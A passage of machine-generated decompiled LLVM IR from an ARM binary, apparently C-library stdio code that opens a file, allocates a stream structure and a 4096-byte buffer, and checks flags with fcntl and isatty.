  %v2_157bc = inttoptr i32 %v1_157bc to i8*
  %v3_157bc = load i8, i8* %v2_157bc, align 1
  %v4_157bc = zext i8 %v3_157bc to i32
  store i32 %v4_157bc, i32* @r3, align 4
  %v2_157c0 = icmp ugt i8 %v3_157bc, 42
  store i1 %v2_157c0, i1* %cpsr_c.global-to-local, align 1
  %v7_157c0 = icmp eq i8 %v3_157bc, 43
  br i1 %v7_157c0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_157ac
  store i32 %v1_157c4, i32* @r3, align 4
  %v2_157c8 = add nuw nsw i32 %v1_157c4, 1
  store i32 %v2_157c8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_157ac, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_157cc = icmp eq i32 %v0_15750, 0
  br i1 %v2_157cc, label %dec_label_pc_157d4, label %dec_label_pc_15810

dec_label_pc_157d4:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_157d8 = call i32 @malloc()
  store i32 %v0_157d8, i32* %r0.global-to-local, align 4
  store i32 %v0_157d8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_157dc = icmp eq i32 %v0_157d8, 0
  br i1 %v3_157dc, label %dec_label_pc_15b50, label %dec_label_pc_157e4

dec_label_pc_157e4:                               ; preds = %dec_label_pc_157d4
  %v0_157e8 = load i32, i32* @r8, align 4
  %v2_157e8 = add i32 %v0_157e8, -33136
  store i32 %v2_157e8, i32* %r3.global-to-local, align 4
  %v1_157ec = inttoptr i32 %v2_157e8 to i32*
  %v2_157ec = load i32, i32* %v1_157ec, align 4
  store i32 %v2_157ec, i32* %r0.global-to-local, align 4
  %v3_157ec = add i32 %v0_157e8, -33132
  %v4_157ec = inttoptr i32 %v3_157ec to i32*
  %v5_157ec = load i32, i32* %v4_157ec, align 4
  store i32 %v5_157ec, i32* @r1, align 4
  %v6_157ec = add i32 %v0_157e8, -33128
  %v7_157ec = inttoptr i32 %v6_157ec to i32*
  %v8_157ec = load i32, i32* %v7_157ec, align 4
  store i32 %v8_157ec, i32* %r2.global-to-local, align 4
  %v2_157f8 = add i32 %v0_157d8, 8
  %v3_157f8 = inttoptr i32 %v2_157f8 to i32*
  store i32 0, i32* %v3_157f8, align 4
  %v2_15800 = load i32, i32* @r5, align 4
  %v3_15800 = inttoptr i32 %v2_15800 to i16*
  store i16 8192, i16* %v3_15800, align 2
  %v2_15804 = load i32, i32* %r0.global-to-local, align 4
  %v0_15808 = load i32, i32* @r5, align 4
  %v1_15808 = add i32 %v0_15808, 56
  store i32 %v1_15808, i32* @r3, align 4
  %v1_1580c = inttoptr i32 %v1_15808 to i32*
  store i32 %v2_15804, i32* %v1_1580c, align 4
  %v3_1580c = add i32 %v0_15808, 60
  %v4_1580c = inttoptr i32 %v3_1580c to i32*
  %v5_1580c = load i32, i32* @r1, align 4
  store i32 %v5_1580c, i32* %v4_1580c, align 4
  %v6_1580c = add i32 %v0_15808, 64
  %v7_1580c = inttoptr i32 %v6_1580c to i32*
  %v8_1580c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1580c, i32* %v7_1580c, align 4
  %v0_15810.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %.thread3, %dec_label_pc_157e4
  %v0_15868 = phi i32 [ %v0_15754, %.thread3 ], [ %v0_15810.pre, %dec_label_pc_157e4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15810 = icmp slt i32 %v0_15868, 0
  br i1 %v1_15810, label %dec_label_pc_15868, label %dec_label_pc_15818

dec_label_pc_15818:                               ; preds = %dec_label_pc_15810
  %v0_1581c = load i32, i32* @r4, align 4
  %v2_1581c = and i32 %v0_1581c, 131075
  %v1_15820 = add nuw nsw i32 %v2_1581c, 1
  store i32 %v1_15820, i32* %r2.global-to-local, align 4
  %v0_15824 = load i32, i32* @r7, align 4
  %v1_15824 = add i32 %v0_15824, 1
  %v2_15828 = and i32 %v1_15824, %v1_15820
  store i32 %v2_15828, i32* %r3.global-to-local, align 4
  %v3_1582c = icmp uge i32 %v2_15828, %v1_15820
  store i1 %v3_1582c, i1* %cpsr_c.global-to-local, align 1
  %v9_1582c = icmp eq i32 %v2_15828, %v1_15820
  %v1_15830 = load i32, i32* @r5, align 4
  %v2_15830 = add i32 %v1_15830, 4
  %v3_15830 = inttoptr i32 %v2_15830 to i32*
  store i32 %v0_15868, i32* %v3_15830, align 4
  br i1 %v9_1582c, label %dec_label_pc_15838, label %dec_label_pc_15774

dec_label_pc_15838:                               ; preds = %dec_label_pc_15818
  %v0_15838 = load i32, i32* @r4, align 4
  %v1_15838 = load i32, i32* @r7, align 4
  %v2_15838 = sub i32 -1, %v1_15838
  %v3_15838 = and i32 %v0_15838, %v2_15838
  store i32 %v3_15838, i32* @r3, align 4
  %v1_1583c = and i32 %v3_15838, 1024
  %v2_1583c = icmp eq i32 %v1_1583c, 0
  br i1 %v2_1583c, label %dec_label_pc_1585c, label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15838
  %v0_15844 = load i32, i32* @r6, align 4
  store i32 %v0_15844, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_15850 = call i32 @__libc_fcntl(i32 %v0_15844, i32 4)
  store i32 %v2_15850, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15854 = icmp eq i32 %v2_15850, 0
  br i1 %v2_15854, label %dec_label_pc_15844.dec_label_pc_1585c_crit_edge, label %dec_label_pc_15774

dec_label_pc_15844.dec_label_pc_1585c_crit_edge:  ; preds = %dec_label_pc_15844
  %v0_1585c.pre = load i32, i32* @r7, align 4
  %v0_15860.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1585c

dec_label_pc_1585c:                               ; preds = %dec_label_pc_15844.dec_label_pc_1585c_crit_edge, %dec_label_pc_15838
  %v0_15860 = phi i32 [ %v0_15860.pre, %dec_label_pc_15844.dec_label_pc_1585c_crit_edge ], [ %v0_15838, %dec_label_pc_15838 ]
  %v0_1585c = phi i32 [ %v0_1585c.pre, %dec_label_pc_15844.dec_label_pc_1585c_crit_edge ], [ %v1_15838, %dec_label_pc_15838 ]
  %v1_1585c = and i32 %v0_1585c, 131072
  store i32 %v1_1585c, i32* %r3.global-to-local, align 4
  %v2_15860 = or i32 %v1_1585c, %v0_15860
  store i32 %v2_15860, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1588c

dec_label_pc_15868:                               ; preds = %dec_label_pc_15810
  %v2_15868 = icmp eq i32 %v0_15868, -1
  store i1 %v2_15868, i1* %cpsr_c.global-to-local, align 1
  %v7_15868 = icmp eq i32 %v0_15868, -1
  %v0_15874.pre = load i32, i32* @r4, align 4
  br i1 %v7_15868, label %dec_label_pc_15868._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_15868
  %v2_1586c = or i32 %v0_15874.pre, 131072
  store i32 %v2_1586c, i32* @r4, align 4
  br label %dec_label_pc_15868._crit_edge

dec_label_pc_15868._crit_edge:                    ; preds = %dec_label_pc_15868, %bb53
  %v0_15874 = phi i32 [ %v2_1586c, %bb53 ], [ %v0_15874.pre, %dec_label_pc_15868 ]
  %v0_15870 = load i32, i32* @r7, align 4
  store i32 %v0_15870, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1587c = call i32 @__libc_open(i32 %v0_15870, i32 %v0_15874)
  store i32 %v2_1587c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15880 = icmp slt i32 %v2_1587c, 0
  %v1_15884 = load i32, i32* @r5, align 4
  %v2_15884 = add i32 %v1_15884, 4
  %v3_15884 = inttoptr i32 %v2_15884 to i32*
  store i32 %v2_1587c, i32* %v3_15884, align 4
  br i1 %v1_15880, label %dec_label_pc_15790, label %.dec_label_pc_1588c_crit_edge

.dec_label_pc_1588c_crit_edge:                    ; preds = %dec_label_pc_15868._crit_edge
  %v0_15890.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1588c

dec_label_pc_1588c:                               ; preds = %.dec_label_pc_1588c_crit_edge, %dec_label_pc_1585c
  %v0_158a8 = phi i32 [ %v0_15890.pre, %.dec_label_pc_1588c_crit_edge ], [ %v2_15860, %dec_label_pc_1585c ]
  %v0_1588c = load i32, i32* @r5, align 4
  %v1_1588c = inttoptr i32 %v0_1588c to i16*
  %v2_1588c = load i16, i16* %v1_1588c, align 2
  %v3_1588c = zext i16 %v2_1588c to i32
  %v1_15890 = urem i32 %v0_158a8, 4
  %v1_15894 = and i32 %v0_158a8, 1024
  %v1_15898 = and i32 %v3_1588c, 8192
  %v1_1589c = add nuw nsw i32 %v1_15890, 1
  %v2_158a0 = or i32 %v1_15898, %v1_15894
  store i32 %v2_158a0, i32* %r3.global-to-local, align 4
  %v1_158a4 = xor i32 %v1_1589c, 3
  %v1_158a8 = and i32 %v0_158a8, 131072
  store i32 %v1_158a8, i32* %r2.global-to-local, align 4
  %v2_158a8 = icmp eq i32 %v1_158a8, 0
  %v1_158ac = add i32 %v0_1588c, 4
  %v2_158ac = inttoptr i32 %v1_158ac to i32*
  %v3_158ac = load i32, i32* %v2_158ac, align 4
  store i32 %v3_158ac, i32* @r4, align 4
  br i1 %v2_158a8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1588c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1588c, %bb54
  %v0_158b8 = phi i32 [ 0, %dec_label_pc_1588c ], [ 32768, %bb54 ]
  %v4_158b4 = mul nuw nsw i32 %v1_158a4, 16
  %v5_158b4 = or i32 %v2_158a0, %v4_158b4
  store i32 %v5_158b4, i32* %r3.global-to-local, align 4
  %v2_158b8 = or i32 %v0_158b8, %v5_158b4
  store i32 %v2_158b8, i32* %r2.global-to-local, align 4
  %v2_158bc = icmp ugt i32 %v3_158ac, 2147483646
  store i1 %v2_158bc, i1* %cpsr_c.global-to-local, align 1
  %v8_158bc = icmp eq i32 %v3_158ac, 2147483647
  %v1_158c0 = trunc i32 %v2_158b8 to i16
  store i16 %v1_158c0, i16* %v1_1588c, align 2
  br i1 %v8_158bc, label %dec_label_pc_15900, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %bb55
  store i32 48664, i32* %r3.global-to-local, align 4
  %v0_158cc = call i32 @__aeabi_read_tp()
  %v3_158d0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_158d0 = sext i16 %v3_158d0 to i32
  store i32 %v4_158d0, i32* @r3, align 4
  store i32 %v0_158cc, i32* @r6, align 4
  %v0_158d8 = load i32, i32* @r4, align 4
  store i32 %v0_158d8, i32* @r0, align 4
  %v2_158dc = add i32 %v4_158d0, %v0_158cc
  %v3_158dc = inttoptr i32 %v2_158dc to i32*
  %v4_158dc = load i32, i32* %v3_158dc, align 4
  store i32 %v4_158dc, i32* @r4, align 4
  %v1_158e0 = call i32 @isatty(i32 %v0_158d8)
  store i32 %v1_158e0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158e4 = icmp eq i32 %v1_158e0, 0
  br i1 %v2_158e4, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_158c8
  %v1_158e8 = load i32, i32* @r5, align 4
  %v2_158e8 = inttoptr i32 %v1_158e8 to i16*
  %v3_158e8 = load i16, i16* %v2_158e8, align 2
  %v4_158e8 = zext i16 %v3_158e8 to i32
  %v2_158ec = or i32 %v4_158e8, 256
  store i32 %v2_158ec, i32* %r3.global-to-local, align 4
  %v2_158f0 = trunc i32 %v2_158ec to i16
  store i16 %v2_158f0, i16* %v2_158e8, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_158c8, %bb56
  %v3_158f8 = load i16, i16* @global_var_216f0.341, align 2
  %v4_158f8 = sext i16 %v3_158f8 to i32
  store i32 %v4_158f8, i32* %r3.global-to-local, align 4
  %v0_158fc = load i32, i32* @r4, align 4
  %v1_158fc = load i32, i32* @r6, align 4
  %v3_158fc = add i32 %v1_158fc, %v4_158f8
  %v4_158fc = inttoptr i32 %v3_158fc to i32*
  store i32 %v0_158fc, i32* %v4_158fc, align 4
  br label %dec_label_pc_15900

dec_label_pc_15900:                               ; preds = %bb55, %.thread5
  %v0_15900 = load i32, i32* @r5, align 4
  %v1_15900 = add i32 %v0_15900, 8
  %v2_15900 = inttoptr i32 %v1_15900 to i32*
  %v3_15900 = load i32, i32* %v2_15900, align 4
  store i32 %v3_15900, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15904 = icmp eq i32 %v3_15900, 0
  br i1 %v2_15904, label %dec_label_pc_1590c, label %bb57

dec_label_pc_1590c:                               ; preds = %dec_label_pc_15900
  store i32 4096, i32* @r0, align 4
  %v0_15910 = call i32 @malloc()
  store i32 %v0_15910, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15914 = icmp eq i32 %v0_15910, 0
  %v1_15924.pre = load i32, i32* @r5, align 4
  br i1 %v2_15914, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1590c
  %v2_15918 = inttoptr i32 %v1_15924.pre to i16*
  %v3_15918 = load i16, i16* %v2_15918, align 2
  %v4_15918 = zext i16 %v3_15918 to i32
  %v2_1591c = add i32 %v0_15910, 4096
  store i32 %v2_1591c, i32* %r2.global-to-local, align 4
  %v2_15920 = or i32 %v4_15918, 16384
  store i32 %v2_15920, i32* %r3.global-to-local, align 4
  %v2_15924 = add i32 %v1_15924.pre, 8
  %v3_15924 = inttoptr i32 %v2_15924 to i32*
  store i32 %v0_15910, i32* %v3_15924, align 4
  %v1_15928 = load i32, i32* %r2.global-to-local, align 4
  %v2_15928 = load i32, i32* @r5, align 4
  %v3_15928 = add i32 %v2_15928, 12
  %v4_15928 = inttoptr i32 %v3_15928 to i32*
  store i32 %v1_15928, i32* %v4_15928, align 4
  %v1_1592c = load i32, i32* %r3.global-to-local, align 4
  %v2_1592c = trunc i32 %v1_1592c to i16
  %v3_1592c = load i32, i32* @r5, align 4
  %v4_1592c = inttoptr i32 %v3_1592c to i16*
  store i16 %v2_1592c, i16* %v4_1592c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1590c
  %v2_1592437 = add i32 %v1_15924.pre, 8
  %v3_1592438 = inttoptr i32 %v2_1592437 to i32*
  store i32 0, i32* %v3_1592438, align 4
  %v2_15930 = load i32, i32* @r5, align 4
  %v3_15930 = add i32 %v2_15930, 12
  %v4_15930 = inttoptr i32 %v3_15930 to i32*
  store i32 0, i32* %v4_15930, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_15900, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1593c = load i32, i32* @r8, align 4
  %v2_1593c = add i32 %v0_1593c, 92
  %v3_1593c = inttoptr i32 %v2_1593c to i32*
  %v4_1593c = load i32, i32* %v3_1593c, align 4
  store i32 %v4_1593c, i32* %r3.global-to-local, align 4
  %v2_15940 = load i32, i32* @r5, align 4
  %v3_15940 = add i32 %v2_15940, 2
  %v4_15940 = inttoptr i32 %v3_15940 to i8*
  store i8 0, i8* %v4_15940, align 1
  %v0_15944 = load i32, i32* @r5, align 4
  %v1_15944 = inttoptr i32 %v0_15944 to i16*
  %v2_15944 = load i16, i16* %v1_15944, align 2
  %v3_15944 = zext i16 %v2_15944 to i32
  store i32 %v3_15944, i32* %r2.global-to-local, align 4
  %v0_15948 = load i32, i32* %r3.global-to-local, align 4
  %v1_15948 = inttoptr i32 %v0_15948 to i32*
  %v2_15948 = load i32, i32* %v1_15948, align 4
  store i32 %v2_15948, i32* @r1, align 4
  %v1_1594c = add i32 %v0_15944, 8
  %v2_1594c = inttoptr i32 %v1_1594c to i32*
  %v3_1594c = load i32, i32* %v2_1594c, align 4
  store i32 %v3_1594c, i32* %r3.global-to-local, align 4
  %v1_15950 = and i32 %v3_15944, 8192
  %v2_15950 = icmp eq i32 %v1_15950, 0
  %v2_15954 = add i32 %v0_15944, 20
  %v3_15954 = inttoptr i32 %v2_15954 to i32*
  store i32 %v3_1594c, i32* %v3_15954, align 4
  %v0_15958 = load i32, i32* @r1, align 4
  %v1_15958 = load i32, i32* @r5, align 4
  %v2_15958 = add i32 %v1_15958, 52
  %v3_15958 = inttoptr i32 %v2_15958 to i32*
  store i32 %v0_15958, i32* %v3_15958, align 4
  %v0_1595c = load i32, i32* %r3.global-to-local, align 4
  %v1_1595c = load i32, i32* @r5, align 4
  %v2_1595c = add i32 %v1_1595c, 24
  %v3_1595c = inttoptr i32 %v2_1595c to i32*
  store i32 %v0_1595c, i32* %v3_1595c, align 4
  %v0_15960 = load i32, i32* %r3.global-to-local, align 4
  %v1_15960 = load i32, i32* @r5, align 4
  %v2_15960 = add i32 %v1_15960, 28
  %v3_15960 = inttoptr i32 %v2_15960 to i32*
  store i32 %v0_15960, i32* %v3_15960, align 4
  %v0_15964 = load i32, i32* %r3.global-to-local, align 4
  %v1_15964 = load i32, i32* @r5, align 4
  %v2_15964 = add i32 %v1_15964, 16
  %v3_15964 = inttoptr i32 %v2_15964 to i32*
  store i32 %v0_15964, i32* %v3_15964, align 4
  %v0_15968 = load i32, i32* %r4.global-to-local, align 4
  %v1_15968 = load i32, i32* @r5, align 4
  %v2_15968 = add i32 %v1_15968, 44
  %v3_15968 = inttoptr i32 %v2_15968 to i32*
  store i32 %v0_15968, i32* %v3_15968, align 4
  br i1 %v2_15950, label %dec_label_pc_15b50, label %dec_label_pc_15970

dec_label_pc_15970:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15974 = load i32, i32* @r8, align 4
  %v2_15974 = add i32 %v0_15974, 160
  %v3_15974 = inttoptr i32 %v2_15974 to i32*
  %v4_15974 = load i32, i32* %v3_15974, align 4
  store i32 %v4_15974, i32* %r7.global-to-local, align 4
  %v0_15978 = call i32 @__aeabi_read_tp()
  store i32 %v0_15978, i32* %r0.global-to-local, align 4
  %v1_1597c = add i32 %v4_15974, 8
  %v2_1597c = inttoptr i32 %v1_1597c to i32*
  %v3_1597c = load i32, i32* %v2_1597c, align 4
  store i32 %v3_1597c, i32* %r3.global-to-local, align 4
  %v1_15980 = add i32 %v0_15978, -1168
  store i32 %v1_15980, i32* %r6.global-to-local, align 4
  %v3_15984 = icmp uge i32 %v3_1597c, %v1_15980
  store i1 %v3_15984, i1* %cpsr_c.global-to-local, align 1
  %v9_15984 = icmp eq i32 %v3_1597c, %v1_15980
  br i1 %v9_15984, label %dec_label_pc_159c8, label %dec_label_pc_1598c

dec_label_pc_1598c:                               ; preds = %dec_label_pc_15970
  store i32 %v4_15974, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %dec_label_pc_159a0.dec_label_pc_15994_crit_edge, %dec_label_pc_1598c
  %v0_15994 = phi i32 [ %v0_15994.pre, %dec_label_pc_159a0.dec_label_pc_15994_crit_edge ], [ %v4_15974, %dec_label_pc_1598c ]
  %v1_15994 = inttoptr i32 %v0_15994 to i32*
  %v2_15994 = load i32, i32* %v1_15994, align 4
  store i32 %v2_15994, i32* %r3.global-to-local, align 4
  %v1_15998 = load i32, i32* %r4.global-to-local, align 4
  %v3_15998 = icmp uge i32 %v2_15994, %v1_15998
  store i1 %v3_15998, i1* %cpsr_c.global-to-local, align 1
  %v9_15998 = icmp eq i32 %v2_15994, %v1_15998
  br i1 %v9_15998, label %dec_label_pc_159a0, label %dec_label_pc_159b8

dec_label_pc_159a0:                               ; preds = %dec_label_pc_15994
  store i32 %v2_15994, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_159b0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_159b0, label %dec_label_pc_159b4, label %dec_label_pc_159a0.dec_label_pc_15994_crit_edge

dec_label_pc_159a0.dec_label_pc_15994_crit_edge:  ; preds = %dec_label_pc_159a0
  %v0_15994.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15994

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159a0
  %v0_159b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_159b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_159b8

dec_label_pc_159b8:                               ; preds = %dec_label_pc_15994, %dec_label_pc_159b4
  %v0_159b8 = phi i32 [ %v0_159b4, %dec_label_pc_159b4 ], [ %v2_15994, %dec_label_pc_15994 ]
  %v1_159b8 = phi i32 [ %v0_159b4, %dec_label_pc_159b4 ], [ %v1_15998, %dec_label_pc_15994 ]
  %v3_159b8 = icmp uge i32 %v0_159b8, %v1_159b8
  store i1 %v3_159b8, i1* %cpsr_c.global-to-local, align 1
  %v9_159b8 = icmp eq i32 %v0_159b8, %v1_159b8
  br i1 %v9_159b8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_159b8
  %v1_159bc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_159bc, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_159b8, %bb58
  %v1_159c0 = xor i1 %v9_159b8, true
  call void @__pseudo_cond_branch(i1 %v1_159c0, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_159c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_159c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_159c4 = add i32 %v1_159c4, 8
  %v3_159c4 = inttoptr i32 %v2_159c4 to i32*
  store i32 %v0_159c4, i32* %v3_159c4, align 4
  %v1_159e4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_159c8

dec_label_pc_159c8:                               ; preds = %dec_label_pc_15970, %bb59
  %v1_159e4 = phi i32 [ %v3_1597c, %dec_label_pc_15970 ], [ %v1_159e4.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_159cc = load i32, i32* @r8, align 4
  %v2_159cc = add i32 %v0_159cc, 160
  %v3_159cc = inttoptr i32 %v2_159cc to i32*
  %v4_159cc = load i32, i32* %v3_159cc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_159d4 = add i32 %v0_159cc, 152
  %v3_159d4 = inttoptr i32 %v2_159d4 to i32*
  %v4_159d4 = load i32, i32* %v3_159d4, align 4
  store i32 %v4_159d4, i32* %r7.global-to-local, align 4
  %v1_159d8 = add i32 %v4_159cc, 4
  %v2_159d8 = inttoptr i32 %v1_159d8 to i32*
  %v3_159d8 = load i32, i32* %v2_159d8, align 4
  store i32 %v3_159d8, i32* %r3.global-to-local, align 4
  %v1_159dc = add i32 %v4_159d4, 8
  %v2_159dc = inttoptr i32 %v1_159dc to i32*
  %v3_159dc = load i32, i32* %v2_159dc, align 4
  store i32 %v3_159dc, i32* %r2.global-to-local, align 4
  %v1_159e0 = add i32 %v3_159d8, 1
  store i32 %v1_159e0, i32* %r3.global-to-local, align 4
  %v3_159e4 = icmp uge i32 %v3_159dc, %v1_159e4
  store i1 %v3_159e4, i1* %cpsr_c.global-to-local, align 1
  %v9_159e4 = icmp eq i32 %v3_159dc, %v1_159e4
  store i32 %v1_159e0, i32* %v2_159d8, align 4
  br i1 %v9_159e4, label %dec_label_pc_15a30, label %dec_label_pc_159f0

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159c8
  %v0_159f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_159f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_159fc95 = inttoptr i32 %v0_159f4 to i32*
  %v2_159fc96 = load i32, i32* %v1_159fc95, align 4
  store i32 %v2_159fc96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15a0098 = icmp eq i32 %v2_159fc96, 0
  br i1 %v9_15a0098, label %dec_label_pc_15a08, label %dec_label_pc_15a20

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159f0, %dec_label_pc_15a08.dec_label_pc_159fc_crit_edge
  %v0_15a0899 = phi i32 [ %v1_15a00.pre, %dec_label_pc_15a08.dec_label_pc_159fc_crit_edge ], [ 0, %dec_label_pc_159f0 ]
  store i32 %v0_15a0899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15a18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a18, label %dec_label_pc_15a1c, label %dec_label_pc_15a08.dec_label_pc_159fc_crit_edge

dec_label_pc_15a08.dec_label_pc_159fc_crit_edge:  ; preds = %dec_label_pc_15a08
  %v0_159fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a00.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_159fc = inttoptr i32 %v0_159fc.pre to i32*
  %v2_159fc = load i32, i32* %v1_159fc, align 4
  store i32 %v2_159fc, i32* %r3.global-to-local, align 4
  %v3_15a00 = icmp uge i32 %v2_159fc, %v1_15a00.pre
  store i1 %v3_15a00, i1* %cpsr_c.global-to-local, align 1
  %v9_15a00 = icmp eq i32 %v2_159fc, %v1_15a00.pre
  br i1 %v9_15a00, label %dec_label_pc_15a08, label %dec_label_pc_15a20

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_15a08
  %v0_15a1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15a1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15a20

dec_label_pc_15a20:                               ; preds = %dec_label_pc_159f0, %dec_label_pc_15a08.dec_label_pc_159fc_crit_edge, %dec_label_pc_15a1c
  %v0_15a20 = phi i32 [ %v0_15a1c, %dec_label_pc_15a1c ], [ %v2_159fc96, %dec_label_pc_159f0 ], [ %v2_159fc, %dec_label_pc_15a08.dec_label_pc_159fc_crit_edge ]
  %v1_15a20 = phi i32 [ %v0_15a1c, %dec_label_pc_15a1c ], [ 0, %dec_label_pc_159f0 ], [ %v1_15a00.pre, %dec_label_pc_15a08.dec_label_pc_159fc_crit_edge ]
  %v3_15a20 = icmp uge i32 %v0_15a20, %v1_15a20
  store i1 %v3_15a20, i1* %cpsr_c.global-to-local, align 1
  %v9_15a20 = icmp eq i32 %v0_15a20, %v1_15a20
  br i1 %v9_15a20, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_15a20
  %v1_15a24 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15a24, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_15a20, %bb60
  %v1_15a28 = xor i1 %v9_15a20, true
  call void @__pseudo_cond_branch(i1 %v1_15a28, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_15a2c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a2c = load i32, i32* %r7.global-to-local, align 4
  %v2_15a2c = add i32 %v1_15a2c, 8
  %v3_15a2c = inttoptr i32 %v2_15a2c to i32*
  store i32 %v0_15a2c, i32* %v3_15a2c, align 4
  br label %dec_label_pc_15a30

dec_label_pc_15a30:                               ; preds = %dec_label_pc_159c8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15a34 = load i32, i32* @r8, align 4
  %v2_15a34 = add i32 %v0_15a34, 152
  %v3_15a34 = inttoptr i32 %v2_15a34 to i32*
  %v4_15a34 = load i32, i32* %v3_15a34, align 4
  store i32 %v4_15a34, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_15a3c = add i32 %v0_15a34, 76
  %v3_15a3c = inttoptr i32 %v2_15a3c to i32*
  %v4_15a3c = load i32, i32* %v3_15a3c, align 4
  store i32 %v4_15a3c, i32* @r1, align 4
  %v1_15a40 = add i32 %v4_15a34, 4
  %v2_15a40 = inttoptr i32 %v1_15a40 to i32*
  %v3_15a40 = load i32, i32* %v2_15a40, align 4
  store i32 %v3_15a40, i32* %r3.global-to-local, align 4
  %v1_15a44 = inttoptr i32 %v4_15a3c to i32*
  %v2_15a44 = load i32, i32* %v1_15a44, align 4
  store i32 %v2_15a44, i32* %r2.global-to-local, align 4
  %v1_15a48 = add i32 %v3_15a40, 1
  store i32 %v1_15a48, i32* %r3.global-to-local, align 4
  store i32 %v1_15a48, i32* %v2_15a40, align 4
  %v0_15a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a50 = load i32, i32* @r5, align 4
  %v2_15a50 = add i32 %v1_15a50, 32
  %v3_15a50 = inttoptr i32 %v2_15a50 to i32*
  store i32 %v0_15a50, i32* %v3_15a50, align 4
  %v0_15a54 = load i32, i32* %r0.global-to-local, align 4
  %v1_15a54 = add i32 %v0_15a54, 4
  %v2_15a54 = inttoptr i32 %v1_15a54 to i32*
  %v3_15a54 = load i32, i32* %v2_15a54, align 4
  %v1_15a58 = add i32 %v3_15a54, -1
  store i32 %v1_15a58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15a5c = icmp eq i32 %v1_15a58, 0
  %v0_15a60 = load i32, i32* @r5, align 4
  %v1_15a60 = load i32, i32* @r1, align 4
  %v2_15a60 = inttoptr i32 %v1_15a60 to i32*
  store i32 %v0_15a60, i32* %v2_15a60, align 4
  %v0_15a64 = load i32, i32* %r3.global-to-local, align 4
  %v1_15a64 = load i32, i32* %r0.global-to-local, align 4
  %v2_15a64 = add i32 %v1_15a64, 4
